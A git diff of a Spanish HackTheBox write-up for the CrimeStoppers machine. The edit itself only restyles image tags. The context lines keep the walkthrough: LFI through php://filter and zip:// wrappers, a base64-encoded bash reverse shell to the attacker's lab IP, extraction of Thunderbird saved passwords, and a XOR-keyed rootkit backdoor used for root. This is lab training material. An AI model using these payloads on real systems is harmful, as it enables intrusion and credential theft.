@@ -8,7 +8,7 @@ tags        : [ LFI, wrapper, reversing, rootkit, crypto, thunderbird ]
 ---
 Máquina Linux nivel difícil. Explotación web con filtros (**wrappers**) consiguiendo **LFI** y **RCE**, contraseñas de **Thunderbird**, correos llenos de odio, persistencias locas (un **rootkit**) y jugueteo entre **reversing** y **criptografía**.
 
-![120crimestoppersHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120crimestoppersHTB.png)
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120crimestoppersHTB.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 ## TL;DR (Spanish writeup)
 
@@ -34,7 +34,7 @@ Finalmente obtendremos la cadena con la que esta comparando la `key` y haremos f
 
 #### Clasificación de la máquina
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120statistics.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 80%;"/>
 
 Enumeración por montones, vulns conocidas y mucho más real de lo que creemos 👻
 
@@ -151,7 +151,7 @@ Y algo sobre el **FBI** 😨. Sabemos que si o si debemos explotar algo web, as�
 
 ## Puerto 80 [📌](#puerto-80) {#puerto-80}
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Varias cositas encontramos en la web inicial:
 
@@ -161,7 +161,7 @@ Varias cositas encontramos en la web inicial:
 
 Si visitamos el apartado `upload` vemos una **URL** medio interesante y un formulario para enviar información relacionada con algún miembro de `fsociety`:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_uploadForm.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_uploadForm.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 La **URL** con su formato `?op=` nos pone a pensar sobre algunas inyecciones, pero probando algunas básicas no vemos nada, sigamos.
 
@@ -172,7 +172,7 @@ Si llenamos los dos campos con info random:
 
 Enviamos la data y nos redirige a esta página:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_view_withSHA1hash.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_view_withSHA1hash.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Jmmm, el valor `elliot` no lo vemos por ningún lado y solo nos devuelve la información que agregamos...
 
@@ -180,7 +180,7 @@ La **URL** va al recurso `view` y se genera otra variable llamada `secretname` c
 
 Revisando el código fuente del recurso `upload` vemos un comentario bastante llamativo:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_upload_htmlCode.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_upload_htmlCode.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 :o Una referencia a una vulnerabilidad tipo `SQL injection` en algo llamado `Tip`, curiosamente debajo vemos un campo de texto con id `tip`, jmmm, interesantísimo. Parece que ha sido removido ese campo en el viaje a la base de datos y se crea un archivo con él (no me quedo claro), pero igual podemos probar después.
 
@@ -192,21 +192,21 @@ Sigamos con `BurpSuite` así interceptamos las peticiones y vemos como viajan la
 
 Inicialmente jugaremos con el `home`, probemos tu vista, ¿ves algo interesante?:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_home.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_home.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 ¿Lo viste? En nuestro header `Cookie` existe una llamada `admin` y tiene el valor `0`, como indicando que no somos **admin**, pues podemos jugar ya sea con el propio `BurpSuite`, un editor de cookies o con el propio navegador web para cambiar esa cookie al valor `1`, quizás nos convierta en admin o quizás no, probemos:
 
 Usaré la extensión [CookieManager](https://www.google.com/search?client=firefox-b-d&q=cookiemanager) en `Firefox` para cambiar ese valor, actualizamos la página web yyyyyyyyyyyyy junto a `home` y `upload` vemos un nuevo recurso:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_asAdmin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_asAdmin.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Opaa, el apartado `list`, pues veámoslo:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_asAdmin_list.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_asAdmin_list.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Tenemos tooodos los archivos que se han creado, ya que si damos clic en cualquiera vemos nuestros `"hola"` y las distintas pruebas que hicimos antes, pero claro, hay un objeto distinto a los demás: `whiterose.txt`, veamos su contenido:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_asAdmin_view_whiterose.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_asAdmin_view_whiterose.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Encontramos un regaño de alguien contra los desarrolladores, les indica que uno de los parámetros enviados por el método `GET` (los que vemos en la URL) contiene una vulnerabilidad que inicialmente le deja ver el código fuente de algunos objetos, pero hay una prueba que le permitió **ejecutar comandos remotamente** 😯
 
@@ -230,13 +230,13 @@ Intentando enumerar ya sea el archivo `/etc/passwd` o alguno de los objetos que 
 
 Moviéndonos entre parámetros solo nos quedaría uno, `op`, pues intentemos ahora el `LFI` ahí:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_op_etcPasswd_withoutDOTS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_op_etcPasswd_withoutDOTS.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Pero nada, vemos `Error`... Pero podemos probar más cosas, como por ejemplo intentar movernos de carpetas del sistema e ir buscando el archivo `/etc/passwd` (o lo dicho antes, los objetos de la web), esto es sencillo, simplemente vamos saliéndonos de los directorios usando `../`, por lo que cada repetición de esa cadena es un directorio atrás.
 
 Vayámonos bieeeeeen a la raíz del sistema y busquemos `../../../../../etc/passwd`:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_op_etcPasswd_DOTS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_op_etcPasswd_DOTS.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Jmmmm, es un mensaje juguetón, probando cosas vemos que el mensaje sale cuando se envían dos puntos en la cadena. Siguiendo [este post](https://book.hacktricks.xyz/pentesting-web/file-inclusion) vemos algunas pruebas contra los `LFI`, probando y probando llegamos a la [sección de wrappers](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers), que serian como códigos adicionales que le indican a la web como queremos que se maneje la petición. [<u>Más info de wrappers</u>](https://diego.com.es/streams-en-php).
 
@@ -270,11 +270,11 @@ http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=list.php
 http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=list
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_LFIwrapperb64_list_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_LFIwrapperb64_list_DONE.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Vemos una cadena en `base64` gigante, tomémosla y decodifiquémosla:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_LFI_decodeB64_listPHP.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_LFI_decodeB64_listPHP.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Listones, podemos hacer esto mismo con los demás recursos o crearnos un script que simplemente tome el archivo que queremos ver y en su lógica lo decodee y nos lo muestre, ahí les dejo la tarea (:
 
@@ -372,7 +372,7 @@ Pero no estamos del todo perdidos, tenemos la posibilidad de escribir lo que que
 
 Con nuestras pruebas anteriores vimos un **wrapper** con una descripción interesante:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_xyz_wrapperZIPdesc.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_xyz_wrapperZIPdesc.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 > Tomada de: [hacktricks.xyz - **Wrapper zip://**](https://book.hacktricks.xyz/pentesting-web/file-inclusion#wrapper-zip).
 
@@ -427,7 +427,7 @@ Ahora para pegar el contenido del archivo `.zip` podemos hacerlo de varias maner
 
 * ***Ejecutar*** `cat acata.zip | base64 -w 0`***, tomar la cadena en `base64` y pegarla en el campo `tip`.***
 
-  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_zipFileTIP_base64.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_zipFileTIP_base64.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
   Lo siguiente será volver a seleccionar esa cadena pero ahora en **Burp**, dar clic derecho y seguir esta ruta: 
   
@@ -436,15 +436,15 @@ Ahora para pegar el contenido del archivo `.zip` podemos hacerlo de varias maner
     
   Y deberíamos ver algo así:
 
-  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_zipFileTIP_base64decode.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_zipFileTIP_base64decode.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
   Damos clic en `forward`, nos debería llevar al recurso `view` y **veríamos el hash del archivo que generamos**, lo copiamos y damos de nuevo a `forward`. Ya debería estar nuestro archivo subido...
 
-  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_zipFileTIP_base64_uploadedVIEW.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120burp_zipFileTIP_base64_uploadedVIEW.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Algo que descubrí es que desde la web tenemos acceso a `uploads/nuestra_ip/nombre_SHA1_archivo` y se nos descarga ese archivo, o si queremos ver tooodos los objetos subidos simplemente quitamos el hash:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_uploadsIP_listFiles.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_uploadsIP_listFiles.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Bien, podemos descargar el objeto y ver si esta siendo subido con el formato de "comprimido":
 
@@ -500,7 +500,7 @@ http://10.10.10.80/?op=zip://uploads/10.10.14.6/080b0c55f8b278c18430a49a19cdd741
 
 Pero nada, todos nos responden:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapper_error.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapper_error.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 😔 ***Así que F, hay algo en el envío que corrompe nuestro archivo y no permite que se suba correctamente (técnicamente hablando: jodiéndonos la integridad del mismo).***
 
@@ -546,7 +546,7 @@ print(secretname)
 
 Por si no me crees sobre que va en la cadena **base64** e.e
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_ZIPbase64_echo.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_ZIPbase64_echo.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Si lo ejecutamos tendríamos este nombre de archivo:
 
@@ -573,7 +573,7 @@ Perfectisimooooo, son iguales, así que su contenido también es igual, por lo q
 http://10.10.10.80/?op=zip://uploads/10.10.14.6/7aaa6229865be1a673429fe1df2d9317bea8e863
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapperUPdone_FindZIPerror.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapperUPdone_FindZIPerror.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Peeeeeero si referenciamos algún archivo que tenga dentrooooo:
 
@@ -581,15 +581,15 @@ Peeeeeero si referenciamos algún archivo que tenga dentrooooo:
 http://10.10.10.80/?op=zip://uploads/10.10.14.6/7aaa6229865be1a673429fe1df2d9317bea8e863%23hola
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapperUPdone_FindZIPdone.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapperUPdone_FindZIPdone.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Desaparece el errooooooooooooooooooooooooooor...
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_gif_froganxious.gif" style="display: block; margin-left: auto; margin-right: auto; width: 70%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_gif_froganxious.gif" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 70%;"/>
 
 YYYYYYYYYYYYY si le pasamos el parámetro `xmd` con algún comando, ejemplo `id`:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapperUPdone_FindZIPdone_RCEid.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120page80_ZIPwrapperUPdone_FindZIPdone_RCEid.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 TAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOS, conseguimos **RCEEEEEEEEEEE**, dios, como costó (: pero que guapachoso.
 
@@ -631,7 +631,7 @@ Tomamos esa cadena y como comando hacia la máquina le indicamos:
 ❱ python3 rceZIPwrapper.py -i 10.10.14.6 -c 'echo IyEvYmluL2Jhc2ggCgpiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYvNDQzMyAwPiYx | base64 -d | bash'
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_sendREVSH_wwwdataRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_sendREVSH_wwwdataRevSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Listooooones, tamos dentro, hacemos [tratamiento de la **TTY**](https://lanzt.gitbook.io/cheatsheet-pentest/tty) para tener una shell bonita, que no nos de problemas si es que queremos ejecutar `CTRL+C`, nos permita tener histórico y que podamos movernos entre comandos...
 
@@ -687,7 +687,7 @@ Ufff, varios archivos, algunos con nombres llamativos como `key3.db`, `logins.js
 
 Si buscamos en todos los objetos la cadena `username` encontramos algo interesante a la vista:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_wwwSH_thunderbirdF_grepUsername.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_wwwSH_thunderbirdF_grepUsername.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Hay unas credenciales encriptadas y referencias hacia el usuario `dom` 😮 puede ser un **rabbit hole** como pueda que no, exploremos:
 
@@ -753,11 +753,11 @@ Nos sale error, hace falta el archivo `logins.json`, así que también lo pasamo
 ...
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_firepwd_passwordsDumped.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_firepwd_passwordsDumped.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Perrrrrfecto, nos devuelve una contraseña del servicio `imap` y `smtp`, podemos probar a hacer reutilización de contraseñas a ver si son funcionales en el sistema como el usuario `dom`:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_wwwSH_su_dom_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_wwwSH_su_dom_DONE.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Listooooooooooooones, somos **dom** (: antes de seguir veamos rápidamente como hubiera sido con `firefox_decrypt.py`:
 
@@ -808,7 +808,7 @@ Lo descomprimimos, (se genera una carpeta `home`, ahí esta el perfil de **Mozil
 ❱ python3 firefox_decrypt.py 36jinndk.default/
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_firefow_decrypt_passwordsDumped.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_firefow_decrypt_passwordsDumped.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Bien, conseguimos la contraseña, así que con cualquiera de las dos herramientas lo hubiéramos logrado (:
 
@@ -1011,7 +1011,7 @@ Bien, sigamos...
 
 Según la descripción del `rootkit` vemos su uso:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_rootkitrepo_files.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_rootkitrepo_files.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Tenemos dos referencias a archivos, busquémoslos en el sistema:
 
@@ -1078,7 +1078,7 @@ Lo cargamos, analizamos las funciones (`aaa`) del binario y las imprimimos (`afl
 [0x00000f70]> afl
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_afl.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_afl.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Bien, todas con nombres llamativos, pero existe una que se relaciona con nuestra máquina, ¿cuál es? Exacto, `sym.darkarmy`, pues pasemos el lenguaje máquina a lenguaje ensamblador e intentemos (jaaaaaa 😂) entender que esta pasando en esa función, usamos `pdf @` que seria `print disassemble function @ nombre_de_la_funcion`:
 
@@ -1086,7 +1086,7 @@ Bien, todas con nombres llamativos, pero existe una que se relaciona con nuestra
 [0x00000f70]> pdf @ sym.darkarmy
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pdf_darkarmy.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pdf_darkarmy.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 🖤 ***Esto es lo que me gusta de <u>radare2</u>, lindos colores y fácil de ver los flujos :P***
 
@@ -1098,11 +1098,11 @@ Arriba de esta instrucción vemos el mismo proceso solo que ahora en lugar de un
 
 Si nos fijamos hay un loop el cual da 10 iteraciones:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pdf_darkarmy_drawLoop.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pdf_darkarmy_drawLoop.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Listos, algo llamativo es que hace un `xor` por cada byte, compara la string `HackTheBox` con el valor que tenga la dirección `0x00001bf2`, por lo que podemos pensar que `HackTheBox` es la llave necesaria para jugar con el `xor`:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_xor_example.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120google_xor_example.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Pues veamos el contenido de esa dirección:
 
@@ -1110,7 +1110,7 @@ Pues veamos el contenido de esa dirección:
 [0x00000f70]> pxw @ 0x00001bf2
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pxw_1bf2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pxw_1bf2.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Ahora, si recordamos el bucle hace 10 iteraciones, por lo que de ese output de arriba debemos tomar los 10 caracteres:
 
@@ -1166,15 +1166,15 @@ print(text)
 
 Perfecto, si ejecutamos el script, vemos:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_xorKEY_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_script_xorKEY_done.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Opa, interesante, si lo concatenamos con nuestra enumeración (que no puse antes para no enredar) del binario vemos la función `sym.rootme_post_read_request` que es la que valida lo que le pasemos cuando ejecutamos `nc localhost 80`:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pdf_postREADrequests.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_r2_pdf_postREADrequests.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Ahí vemos que toma un argumento, así que podemos probar esa cadena devuelta por el programa ahora sobre el `rootkit`:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_domSH_rootkitDONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_domSH_rootkitDONE.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 PERFECTOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo, tenemos el `rootkit` en funcionamiento, por lo tanto tenemos una Shell como el usuario **root** (:
 
@@ -1229,11 +1229,11 @@ Y ahora desde nuestra máquina nos conectamos a esa dirección con el usuario `d
 ❱ ssh dom@dead:beef::250:56ff:feb9:6c2b
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_ssh_domSH_ipv6.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120bash_ssh_domSH_ipv6.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Peeeererererfecto, ahora sí, veamos las flags:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/crimestoppers/120flags.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 ...
 
